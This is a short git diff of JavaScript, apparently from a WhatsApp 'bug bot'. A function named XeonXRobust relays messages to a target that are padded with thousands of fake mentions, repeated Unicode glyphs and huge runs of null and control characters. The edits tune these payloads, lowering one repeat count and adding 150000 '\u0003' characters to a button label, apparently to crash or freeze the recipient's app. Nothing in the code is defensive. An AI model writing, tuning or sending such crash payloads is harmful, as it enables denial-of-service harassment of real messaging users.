@@ -424,7 +424,7 @@ const wanted = {
         }
 		
 		    async function XeonXRobust(target, o, Ptcp = true) {
-	const jids = `*_~@13135550002~_*\n`.repeat(10200);
+	const jids = `*_~@13135550002~_*\n`.repeat(8200);
 	const ui = 'ꦽ'.repeat(10000);
    await viper.relayMessage(target, {
      ephemeralMessage: {
@@ -544,9 +544,9 @@ quotedMessage: {
                     footerText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚",
                     buttons: [
                         {
-                            buttonId: "\u0000".repeat(60200),
+                            buttonId: "\u0000",
                             buttonText: {
-                                displayText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚"
+                                displayText: "𝑽᪱͢͢𝒊𝒑𝒆᪳͢ᤡ𝒓𝑻᪳᪳͢𝒛𝒚" + "\u0003".repeat(150000)
                             },
                             type: 1
                         }
